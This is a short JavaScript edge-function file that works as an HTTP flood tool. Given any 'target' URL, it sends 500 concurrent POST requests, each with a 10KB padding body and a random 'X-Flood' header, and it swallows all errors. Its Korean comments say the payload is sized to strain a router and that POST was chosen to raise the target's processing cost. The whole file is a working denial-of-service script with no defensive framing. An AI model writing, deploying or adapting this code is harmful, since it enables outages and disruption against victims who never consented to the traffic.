export const config = { runtime: 'edge' };

export default async function handler(req) {
  const { searchParams } = new URL(req.url);
  const target = searchParams.get('target');
  if (!target) return new Response("MISSING_TARGET");

  // 공유기가 분석하기 힘들게 만드는 거대 더미 데이터 (약 10KB)
  const heavyData = "X".repeat(10240); 

  const attack = Array.from({ length: 500 }).map(() =>
    fetch(target, {
      method: 'POST', // GET보다 처리 비용이 높은 POST 방식 채택
      body: heavyData,
      mode: 'no-cors',
      cache: 'no-cache',
      headers: { 'Content-Type': 'application/text', 'X-Flood': Math.random().toString() }
    }).catch(() => {})
  );

  await Promise.all(attack);
  return new Response("HEAVY_PACKETS_SENT");
}
